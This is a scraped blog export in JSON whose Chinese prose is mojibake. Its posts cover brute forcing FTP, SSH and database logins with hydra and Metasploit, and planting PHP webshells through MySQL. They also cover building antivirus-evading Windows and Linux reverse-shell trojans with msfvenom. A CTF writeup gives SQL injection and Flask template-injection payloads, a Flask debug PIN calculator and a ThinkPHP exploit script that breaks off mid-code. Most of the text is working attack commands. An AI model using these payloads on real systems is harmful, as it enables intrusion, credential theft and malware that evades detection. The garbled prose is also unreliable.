-f 127.0.0.1 ftp å‚æ•°è§£é‡Šï¼š -l root æŒ‡å®šçˆ†ç ´è´¦å·ä¸ºroot -w 10 æŒ‡å®šæ¯ä¸ªçº¿ç¨‹çš„å›åº”æ—¶é—´ä¸º10S -P pwd.txt æŒ‡å®šå¯†ç å­—å…¸ä¸ºpwd.txt -t 10 æŒ‡å®šçˆ†ç ´çº¿ç¨‹ä¸º10ä¸ª -v æŒ‡å®šæ˜¾ç¤ºçˆ†ç ´è¿‡ç¨‹ -f æŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„IDå’Œå¯†ç çš„æ—¶å€™åœæ­¢ç ´è§£ msfå¯ä»¥å…ˆä½¿ç”¨auxiliary/scanner/ftp/ftp_versionå¯¹ç‰ˆæœ¬è¿›è¡Œæ¢æµ‹ 123use auxiliary/scanner/ftp/ftp_versionset rhosts 192.168.0.1exploit å¯ä»¥çœ‹åˆ°æ¢æµ‹å‡ºæ˜¯å¼€æ”¾çš„ï¼Œå¹¶è·å–åˆ°äº†ftpçš„bannerä¿¡æ¯ ç ´è§£å¯†ç å¯ä»¥ä½¿ç”¨auxiliary/scanner/ftp/ftp_login 123456use auxiliary/scanner/ftp/ftp_loginset rhost 192.168.1.1set PASS_FILE /root/Desktop/pass.txtset USERPASS_FILE /root/Desktop/name.txtset THREADS 20run sshhydraåŒæ ·å’Œftpç±»ä¼¼ 1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ssh msfå¯ä»¥ç”¨auxiliary/scanner/ssh/ssh_enumusersè¿™ä¸ªæ¨¡å—æšä¸¾ç”¨æˆ· å¯ä»¥ç”¨auxiliary/scanner/ssh/ssh_loginè¿™ä¸ªæš´åŠ›ç ´è§£ ç”¨auxiliary/scanner/ssh/ssh_versionæ¢æµ‹ç‰ˆæœ¬ ç”¨auxiliary/scanner/ssh/ssh_login_pubkeyè¿›è¡Œå…¬é’¥ç ´è§£ mysqlhydra1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mysql msfä½¿ç”¨auxiliary/scanner/mysql/mysql_versionå¯ä»¥æ¢æµ‹ç‰ˆæœ¬ ä½¿ç”¨auxiliary/admin/mysql/mysql_enumå¯ä»¥è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œæ“ä½œç³»ç»Ÿåç§°ï¼Œæ¶æ„ï¼Œæ•°æ®åº“ç›®å½•ï¼Œæ•°æ®åº“ç”¨æˆ·ä»¥åŠå¯†ç å“ˆå¸Œå€¼ ä½¿ç”¨auxiliary/scanner/mysql/mysql_loginç ´è§£ ä½¿ç”¨auxiliary/scanner/mysql/mysql_hashdumpè¿›è¡Œmysqlå“ˆå¸Œå€¼æšä¸¾ 1234use auxiliary/scanner/mysql/mysql_hashdumpset username rootset password rootrun ä½¿ç”¨auxiliary/admin/mysql/mysql_sqlå¯ä»¥è¿æ¥mysqlç±»ä¼¼äºsqlmapé‡Œçš„â€“sql-shell ä½¿ç”¨auxiliary/scanner/mysql/mysql_schemadumpå¯ä»¥å°†æ•°æ®åº“å¯¼å‡ºåˆ°æœ¬åœ° ä½¿ç”¨auxiliary/scanner/mysql/mysql_file_enumè¿›è¡Œæ–‡ä»¶æšä¸¾ ä½¿ç”¨auxiliary/scanner/mysql/mysql_writable_dirsè¿›è¡Œå¯å†™ç›®å½•æšä¸¾ mysqlæ”»å‡»æ–¹æ³•ä¿¡æ¯æ³„éœ²ä¸€äº›ç½‘ç«™æºä»£ç æ–‡ä»¶ä¸­ä¼šåŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œé€šè¿‡æŸ¥çœ‹è¿™äº›æ–‡ä»¶å¯ä»¥è·å–æ•°æ®åº“è´¦å·å’Œå¯†ç ã€‚ä¸€èˆ¬å¸¸è§çš„æ•°æ®åº“è¿æ¥æ–‡ä»¶ä¸ºconfig.phpã€web.configã€conn.aspã€db.php/aspã€jdbc.propertiesã€sysconfig.propertiesã€JBOSS_HOME\\docs\\examples\\jca\\XXXX-ds.xmlç­‰ç­‰ã€‚ ä½¿ç”¨ultraeditç­‰ç¼–è¾‘æ–‡ä»¶ç¼–è¾‘æ•°æ®åº“é…ç½®æ–‡ä»¶åï¼Œä¼šç•™ä¸‹bakæ–‡ä»¶ mysqlå†™é©¬å‰æéœ€è¦çŸ¥é“ç½‘ç«™çš„çœŸå®ç‰©ç†è·¯å¾„ï¼Œä¾‹å¦‚å‘¼æ±‚å¶çœŸå®è·¯å¾„D:\\work\\WWWï¼Œåˆ™å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼Œæ¥è·å–ä¸€å¥è¯åé—¨æ–‡ä»¶cmd.php 1select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;INTO OUTFILE &#39;D:&#x2F;work&#x2F;WWW&#x2F;shell.php&#39; å½“ç„¶æˆ‘ä»¬å¯ä»¥ç”¨16è¿›åˆ¶å½¢å¼å†™å…¥ 1select unhex(&#39;åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ç”¨0x&#39;) into dumpfile &#39;D:&#x2F;WEB&#x2F;shell.php&#39; general_log_fileå†™é©¬ ï¼ˆ1ï¼‰æŸ¥çœ‹generaæ–‡ä»¶é…ç½®æƒ…å†µ 1show global variables like &quot;%genera%&quot;; ï¼ˆ2ï¼‰å…³é—­general_log 1set global general_log=off; ï¼ˆ3ï¼‰é€šè¿‡general_logé€‰é¡¹æ¥è·å–webshell 12set global general_log=&#x27;on&#x27;;SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;; åœ¨æŸ¥è¯¢ä¸­æ‰§è¡Œè¯­å¥ï¼š 1SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;; Shellä¸ºcmd.phpï¼Œä¸€å¥è¯åé—¨ï¼Œå¯†ç ä¸ºcmdã€‚ mssqlhydra1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mssql msfä½¿ç”¨auxiliary/scanner/mssql/mssql_loginç ´è§£å¯†ç  pcanywhere,vnc,3389åŒæ ·å¼ºå¤§çš„hydraä¹Ÿæ”¯æŒä»¥ä¸Šä¸‰ç§ï¼Œä¸è¿‡æœ€æ–°ç‰ˆæœ¬çš„hydraå¥½åƒä¸æ”¯æŒ3389çš„çˆ†ç ´äº†ï¼Œåªéœ€æ”¹å˜æœåŠ¡ç±»å‹å°±è¡Œ å­—å…¸kaliçš„/usr/share/wordlistsç›®å½•ä¸‹æœ‰å¾ˆå¤š å‚è€ƒï¼š https://blog.csdn.net/Fly_hps/article/details/80943541","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"å¼±å£ä»¤","slug":"å¼±å£ä»¤","permalink":"http://www.m00nback.xyz/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"}]},{"title":"metasploitå­¦ä¹ ","slug":"metasploitå­¦ä¹ ","date":"2020-02-26T14:03:35.000Z","updated":"2020-04-22T09:51:19.979Z","comments":true,"path":"2020/02/26/metasploitå­¦ä¹ /","link":"","permalink":"http://www.m00nback.xyz/2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†msfçš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†msfçš„ç›¸å…³å†…å®¹ï¼ ä»€ä¹ˆæ˜¯msf?msfå…¨ç§°Metasploit Frameworkï¼Œå®ƒé›†æˆäº†å„å¹³å°ä¸Šå¸¸è§çš„æº¢å‡ºæ¼æ´å’Œæµè¡Œçš„ shellcode ï¼Œå¹¶ä¸”ä¸æ–­æ›´æ–°ï¼Œæ˜¯ç›®å‰ä¸–ç•Œä¸Šé¢†å…ˆçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ˜¯è¿„ä»Šä¸ºæ­¢ä½¿ç”¨Rubyæ„å»ºçš„æœ€å¤æ‚çš„é¡¹ç›®ä¹‹ä¸€ï¼Œæ˜¯ä¿¡æ¯å®‰å…¨ä¸æ¸—é€æµ‹è¯•é¢†åŸŸæœ€å¤§çš„å¼€æºé¡¹ç›®ä¹‹ä¸€ã€‚ ä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼š POCï¼šä¸€èˆ¬æ˜¯æŒ‡è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç ã€‚ Exploit(EXP)ï¼šæ”»å‡»ä»£ç æˆ–ç¨‹åºï¼Œå®ƒå…è®¸æ”»å‡»è€…åˆ©ç”¨æ˜“å—æ”»å‡»çš„ç³»ç»Ÿå¹¶å±å®³å…¶å®‰å…¨æ€§ï¼Œæ¯ä¸ªæ¼æ´éƒ½æœ‰å¯¹åº”çš„æ¼æ´åˆ©ç”¨ç¨‹åºã€‚é€šä¿—è§£é‡Šï¼šæ¼æ´åˆ©ç”¨è„šæœ¬ Payloadï¼šæœ‰æ•ˆæ”»å‡»è½½è·ã€‚é€šä¿—è§£é‡Šå°±æ˜¯æ¼æ´åˆ©ç”¨çš„ä¸»è¦æ“ä½œï¼Œæ¯”å¦‚ä½ è¯·æ±‚æŸä¸ªurlå°±èƒ½å†™é©¬ ShellCodeï¼šä¸»è¦ç”¨åœ¨äºŒè¿›åˆ¶æº¢å‡ºæ”»å‡»ä¸Šï¼Œæ¯”å¦‚æ§åˆ¶å¡«å……æ•°æ®çš„å†…å®¹ msfå…æ€msfvenommsfvenomç®€ä»‹msfvenomæ˜¯msfpayloadå’Œmsfencodeçš„ç»“åˆä½“ï¼Œäº2015å¹´6æœˆ8æ—¥å–ä»£äº†msfpayloadå’Œmsfencodeã€‚åœ¨æ­¤ä¹‹åï¼Œmetasploit-frameworkä¸‹é¢çš„çš„msfpayloadï¼ˆè·è½½ç”Ÿæˆå™¨ï¼‰ï¼Œmsfencoderï¼ˆç¼–ç å™¨ï¼‰ï¼Œmsfcliï¼ˆç›‘å¬æ¥å£ï¼‰éƒ½ä¸å†è¢«æ”¯æŒã€‚ ä¸€äº›ç®€å•çš„å‘½ä»¤æ¯”å¦‚æƒ³æŸ¥çœ‹windows/meterpreter/reverse_tcpæ”¯æŒä»€ä¹ˆå¹³å°ã€å“ªäº›é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ 1msfvenom -p windows/meterpreter/reverse_tcp --list-options æŸ¥çœ‹æ‰€æœ‰payload 1msfvenom --list payloads æŸ¥çœ‹æ‰€æœ‰ç¼–ç å™¨ 1msfvenom --list encoders ç”Ÿæˆwindowsæœ¨é©¬ 1234567msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -x encoder.exe -i 15 -b &#x27;\\x00&#x27; -f exe -o payload.exe# -eæŒ‡ä½¿ç”¨å“ªä¸ªç¼–ç å™¨# -xæŒ‡ä»¥å“ªä¸ªæ–‡ä»¶ä¸ºæ¨¡æ¿# -iæŒ‡ç¼–ç æ¬¡æ•°# -bsæ˜¯æŒ‡å»é™¤åå­—èŠ‚# -fæŒ‡æ–‡ä»¶ç±»å‹# -oæŒ‡è¾“å‡ºæ–‡ä»¶è·¯å¾„ ä¹Ÿå¯ä»¥å¤šé‡ç¼–ç ï¼Œä½¿ç”¨ç®¡é“è®©msfvenomå¯¹æ”»å‡»è½½è·å¤šé‡ç¼–ç ï¼Œå…ˆç”¨shikata_ga_naiç¼–ç 20æ¬¡ï¼Œæ¥ç€æ¥10æ¬¡çš„alpha_upperç¼–ç ï¼Œå†æ¥10æ¬¡çš„countdownç¼–ç ï¼Œæœ€åæ‰ç”Ÿæˆä»¥putty.exeä¸ºæ¨¡æ¿çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä½¿ç”¨çš„ç¼–ç ç±»å‹è¶Šå¤šï¼Œå…æ€ç‡å¯èƒ½ä¼šé™ä½ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºå„ç§ç¼–ç å¼•å…¥äº†æ›´å¤šçš„ç‰¹å¾ç ã€‚åŒæ—¶ç”Ÿæˆçš„payloadä¹Ÿå¾ˆå¯èƒ½æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œè¿™ä¸ªä¹Ÿå’Œè¢«æ†ç»‘ç¨‹åºæœ‰ä¸€å®šå…³è”ã€‚ ç”Ÿæˆlinuxæœ¨é©¬ 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.97.210.141 LPORT=4444 -f elf &gt; shell å‚æ•°å’Œä¸Šé¢çš„ä¸€æ · å‡ ä¸ªé‡è¦çš„ç›‘å¬å‚æ•°é˜²æ­¢å‡session åœ¨å®æˆ˜ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°å‡sessionæˆ–è€…åˆšè¿æ¥å°±æ–­å¼€çš„æƒ…å†µï¼Œè¿™é‡Œè¡¥å……ä¸€äº›ç›‘å¬å‚æ•°ï¼Œé˜²æ­¢å‡æ­»ä¸å‡sessionã€‚ 1msf exploit(multi/handler) &gt; set ExitOnSession false //å¯ä»¥åœ¨æ¥æ”¶åˆ°seesionåç»§ç»­ç›‘å¬ç«¯å£ï¼Œä¿æŒä¾¦å¬ã€‚ é˜²æ­¢sessionæ„å¤–é€€å‡º 12msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0 //é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªä¼šè¯å°†åœ¨5åˆ†é’Ÿï¼ˆ300ç§’ï¼‰æ²¡æœ‰ä»»ä½•æ´»åŠ¨ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«æ€æ­»,ä¸ºé˜²æ­¢æ­¤æƒ…å†µå¯å°†æ­¤é¡¹ä¿®æ”¹ä¸º0msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0 //é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ˜ŸæœŸï¼ˆ604800ç§’ï¼‰åï¼Œä¼šè¯å°†è¢«å¼ºåˆ¶å…³é—­,ä¿®æ”¹ä¸º0å¯æ°¸ä¹…ä¸ä¼šè¢«å…³é—­ handleråå°æŒç»­ç›‘å¬ 1msf exploit(multi&#x2F;handler) &gt; exploit -j -z ä½¿ç”¨exploit -j -zå¯åœ¨åå°æŒç»­ç›‘å¬,-jä¸ºåå°ä»»åŠ¡ï¼Œ-zä¸ºæŒç»­ç›‘å¬ï¼Œä½¿ç”¨Jobså‘½ä»¤æŸ¥çœ‹å’Œç®¡ç†åå°ä»»åŠ¡ã€‚jobs -Kå¯ç»“æŸæ‰€æœ‰ä»»åŠ¡ã€‚ è¿˜æœ‰ç§æ¯”è¾ƒå¿«æ·çš„å»ºç«‹ç›‘å¬çš„æ–¹å¼ï¼Œåœ¨msfä¸‹ç›´æ¥æ‰§è¡Œï¼š 1msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp Evasionå…æ€2019å¹´1æœˆï¼Œmetasploitå‡çº§åˆ°äº†5.0ï¼Œå¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ¨¡å—å«Evasionæ¨¡å—ï¼Œå®˜æ–¹å®£ç§°è¿™ä¸ªæ¨¡å—å¯ä»¥åˆ›å»ºåæ€æ¯’è½¯ä»¶çš„æœ¨é©¬ã€‚ evasionæœ‰ä»¥ä¸‹å‡ ä¸ªæ¨¡å—,å¯ä»¥ä½¿ç”¨show evasionè¿›è¡ŒæŸ¥çœ‹: ä½¿ç”¨windows/windows_defender_exeè¿›è¡Œç”Ÿæˆpayload 123456msf5 &gt; use windows/windows_defender_exemsf5 evasion(windows/windows_defender_exe) &gt; set filename payload.exemsf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_exe) &gt; set LHOST 10.211.55.3msf5 evasion(windows/windows_defender_exe) &gt; set LPORT 3333msf5 evasion(windows/windows_defender_exe) &gt; run msfæº¢å‡ºæ”»å‡»windowscve_2019_0708https://www.cnblogs.com/Oran9e/p/11479575.html ms17-010https://www.cnblogs.com/nanstar/p/12120656.html ms08-067https://www.cnblogs.com/feizianquan/p/10799873.html å‚è€ƒï¼š https://www.zhihu.com/question/39878368 https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"msf","slug":"msf","permalink":"http://www.m00nback.xyz/tags/msf/"}]},{"title":"æ–°æ˜¥æˆ˜ç–«èµ›game-gyctféƒ¨åˆ†writeup","slug":"æ–°æ˜¥æˆ˜ç–«èµ›game-gyctféƒ¨åˆ†writeup","date":"2020-02-21T13:33:43.000Z","updated":"2020-03-08T09:51:04.761Z","comments":true,"path":"2020/02/21/æ–°æ˜¥æˆ˜ç–«èµ›game-gyctféƒ¨åˆ†writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†game-gyctfçš„éƒ¨åˆ†writeupï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†game-gyctfçš„éƒ¨åˆ†writeupï¼ webç®€å•çš„æ‹›è˜ç³»ç»Ÿè¿™é¢˜æ˜¯æ˜¯çœŸçš„æ²¡æƒ³åˆ°ï¼ æ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»å‘ç°é‡Œé¢æœ‰ä¸ªé»‘é¡µï¼Œç„¶åç”¨adminä¸‡èƒ½å¯†ç æˆåŠŸç™»é™†è¿›å»ï¼Œçœ‹åˆ°é»‘é¡µ è¿™ä¸ªé»‘é¡µä¸æ˜¯æ¼æ´ç‚¹ï¼Œæ¼æ´ç‚¹å°±åœ¨ç™»é™†ä¸Šï¼Œå¯ä»¥ç›´æ¥è”åˆæŸ¥è¯¢ï¼Œå›æ˜¾åœ¨ç™»é™†åçš„é¡µé¢ä¸Š order by: 1admin&#39; order by 6# ç™»é™†å¤±è´¥ï¼Œè¯´æ˜æœ‰5åˆ— åˆ¤æ–­å›æ˜¾ä½ï¼š 1admin&#39; union select 1,2,3,4,5# å›æ˜¾ä½ä¸ºç¬¬äºŒä¸ª æ³¨æ•°æ®åº“ï¼š 1admin&#39; union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata# æ³¨è¡¨ï¼š 1admin&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()# æ³¨å­—æ®µï¼š 1admin&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&quot;flag&quot;# æ³¨å†…å®¹ï¼š 1admin&#39; union select 1,group_concat(flaaag),3,4,5 from nzhaopin.flag# æ®è¯´ä¸‰ä¸ªåœ°æ–¹éƒ½æœ‰æ³¨å…¥ï¼Œç™»é™†ï¼Œæ³¨å†Œï¼Œé»‘é¡µï¼Œæˆ‘çœŸæ˜¯å¤ªèœäº† easysqli_copyEzsqliç›²æ³¨babyphpblacklistçœ‹åˆ°ç«‹é©¬æƒ³åˆ°äº†å¼ºç½‘æ¯éšä¾¿æ³¨ 121&#39;;show tables; #è¡¨ä¸ºFlagHere1&#39;;desc FlagHere; #æŸ¥çœ‹è¡¨ç»“æ„ï¼Œå‘ç°æœ‰flagå­—æ®µ é¢˜ç›®æ²¡æœ‰è¿‡æ»¤handlerï¼Œå‚è§ï¼š https://dev.mysql.com/doc/refman/8.0/en/handler.html https://skysec.top/2019/12/13/2019-FudanCTF-Writeup handlerç±»ä¼¼äºselectè¯­å¥ï¼Œä½†åˆä¸åŒäºåè€…ï¼Œå®ƒåªèƒ½æ¯æ¬¡æŸ¥è¯¢1æ¬¡è®°å½• æ¯”å¦‚ï¼šé€šè¿‡handlerè¯­å¥æŸ¥è¯¢usersè¡¨çš„å†…å®¹ 123456handler users open as moonback; #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„åˆ«åhandler moonback read first; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„é¦–è¡Œæ•°æ®handler moonback read next; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®handler moonback read next; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®...handler moonback close; #å…³é—­å¥æŸ„ æ‰€ä»¥æˆ‘ä»¬å°±èƒ½æŸ¥å‡ºflag 1231&#x27;;handler FlagHere open as moonback;handler moonback read first;# æˆ–è€…ç›´æ¥1&#x27;;handler FlagHere open;handler FlagHere read first; Flaskappçœ‹åå­—çŒœæµ‹æ˜¯å’Œsstiæ²™ç®±é€ƒé€¸ç›¸å…³å†…å®¹ ä¸è¯»å–pinç éšä¾¿è¾“ä¸€ä¸ªå­—ç¬¦è®©base64è§£å¯†æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°éƒ¨åˆ†æºç  12345678910@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;ç»“æœ ï¼š &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) ç®€å•çš„å°†ä¸€äº›å…³é”®å­—base64ç¼–ç åæäº¤å‘ç°çŸ¥è¯†ç®€å•çš„è¿‡æ»¤äº†å…³é”®å­— 12345678910requestflagsystempopenimport__import__importlibevalossubprocess å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹ä¸‹ï¼šhttps://github.com/vulhub/vulhub/tree/master/flask/sstiçš„exp 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;ev&#x27;+&#x27;al&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;o&quot;+&quot;s&quot;).po&#x27;+&#x27;pen(&quot;cat this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; å°†è¿‡æ»¤çš„ä¸œè¥¿æ‹¼æ¥åˆ°ä¸€å—å°±èƒ½æ‰§è¡Œå‘½ä»¤å¾—åˆ°flagäº† è¯»å–pinç å…ˆä»‹ç»ä¸€ä¸‹pinç ï¼Œflaské¡¹ç›®è¿è¡Œæ—¶å¼€å¯debugæ¨¡å¼æ—¶ä¼šç”Ÿæˆä¸€ä¸ªç”±å½“å‰ç¯å¢ƒçš„pinç ï¼Œç±»ä¼¼äºï¼š 1123-123-123 ä¹Ÿå°±æ˜¯è¯´åœ¨æŸä¸ªç‰¹å®šç¯å¢ƒä¸‹pinç æ˜¯ä¸å˜çš„ è¾“å…¥æ­£ç¡®çš„pinç æˆ‘ä»¬å°±å¯ä»¥è¿›å…¥debugé¡µé¢ï¼Œç„¶åè¾“å…¥ 1&#x2F;console å¯ä»¥è¿›å…¥pythonäº¤äº’å¼shell å…³äºpinç è¯¦ç»†ä»‹ç»å‚è€ƒï¼šhttps://xz.aliyun.com/t/2553 æˆ‘ä»¬éœ€è¦çŸ¥é“6ä¸ªå€¼ï¼š usernameï¼Œä¸ºå¯åŠ¨flaskçš„ç”¨æˆ· modnameï¼Œä¸ºflask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))ï¼Œä¸ºFlask getattr(mod, &#39;__file__&#39;, None)ï¼ŒflaskåŒ…ç›®å½•ä¸‹çš„app.pyçš„ç»å¯¹è·¯å¾„ï¼ŒæŠ¥é”™å¯ä»¥çˆ†å‡ºæ¥ uuid.getnode() ï¼Œmacåœ°å€åè¿›åˆ¶ get_machine_id()ï¼Œ/etc/machine-id çŸ¥é“è¿™6ä¸ªå€¼æˆ‘ä»¬å°±å¯ä»¥ç”¨å¤§ä½¬è„šæœ¬è·‘å‡ºæ¥pinç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;kingkk&#x27;,# username /etc/passwd &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),æŠ¥é”™å¯ä»¥çˆ†å‡ºæ¥]private_bits = [ &#x27;52242498922&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;19949f18ce36422da1402b3e3fe53008&#x27;# get_machine_id(), /etc/machine-idæˆ–è€…/proc/self/cgroupæˆ–/proc/sys/kernel/random/boot_iæˆ–æ³¨å†Œè¡¨SOFTWARE\\\\Microsoft\\\\Cryptographyå€¼]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) å¯ä»¥ç”¨ä¸‹é¢çš„payloadè¯»å–æ–‡ä»¶ï¼š 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä»/etc/passwdå¯ä»¥çœ‹åˆ°æœ‰ä¸ªflaskwebçš„ç”¨æˆ·ï¼Œå°è¯•ç€ç”¨ä¸‹ è¯»å–/proc/self/cgroupï¼Œæ³¨æ„åœ¨dockerç¯å¢ƒä¸­ä¸è¦è¯»/etc/machine-id è¯»å–/sys/class/net/eth0/addressè·å¾—macåœ°å€02:42:ac:12:00:04ï¼Œåè¿›åˆ¶è¡¨è¾¾å¼æ˜¯2485377957892 ä»æŠ¥é”™ä¸­çœ‹åˆ°å¯ä»¥çœ‹åˆ°ç»å¯¹è·¯å¾„ä¸º/usr/local/lib/python3.7/site-packages/flask/app.py å°†å¯¹åº”å†…å®¹å¡«å…¥è¿è¡Œå°±èƒ½å¾—åˆ°pin,æˆ‘è¿™é‡Œæ˜¯922-522-604 easy_thinkingè®¿é—®www.zipï¼Œæœ‰æºç ï¼Œé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯thinkphp6.0.0æœ€æ–°çš„sessionçš„æ¼æ´ å‚è€ƒï¼š https://www.uedbox.com/post/65126/ https://paper.seebug.org/1114/#_1 æŠ¥é”™å¯ä»¥çœ‹å‡ºç‰ˆæœ¬ä¿¡æ¯ å…ˆä»‹ç»ä¸€ä¸‹TPæ¡†æ¶çš„è·¯ç”±è§„åˆ™ 12&#x2F; index.php &#x2F;Index &#x2F;Index &#x2F;index å…¥å£æ–‡ä»¶ æ¨¡å—(å‰å°) æ§åˆ¶å™¨ æ–¹æ³• æœ¬é¢˜çš„åˆ©ç”¨æ–¹å¼ï¼š å…ˆæ­£å¸¸æ³¨å†Œä¸€ä¸ªè´¦å· ç™»é™†æ—¶æŠ“åŒ…å°†sessidæ”¹æˆ.phpç»“å°¾ï¼Œé•¿åº¦å¿…é¡»æ˜¯32ä½ ç„¶åå»æœç´¢å¤„è¾“å…¥ä¸œè¥¿ï¼Œæ¥åˆ°ä¸ªäººä¸­å¿ƒçœ‹æœç´¢å†å²ï¼Œè¿™äº›æœç´¢å†å²éƒ½ä¿å­˜åœ¨/runtime/session/ç›®å½•å†… å†™äº†ä¸ªè„šæœ¬ï¼š 123456789101112131415161718192021222324252627import requestsurl=&#x27;http://182.92.243.154:7893/&#x27;s=requests.session()data=&#123;&quot;username&quot;:&quot;moon&quot;,&quot;password&quot;:&quot;back&quot;&#125;headers=&#123; &quot;Cookie&quot;:&quot;PHPSESSID=1433223143322314332231433223.php&quot; &#125;def req(): s.get(url)def register(data): s.post(url+&quot;home/member/register&quot;,data=data)def login(data): s.post(url+&#x27;home/member/login&#x27;,data=data,headers=headers)def search(): data1=&#123;&quot;key&quot;:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;&#125; 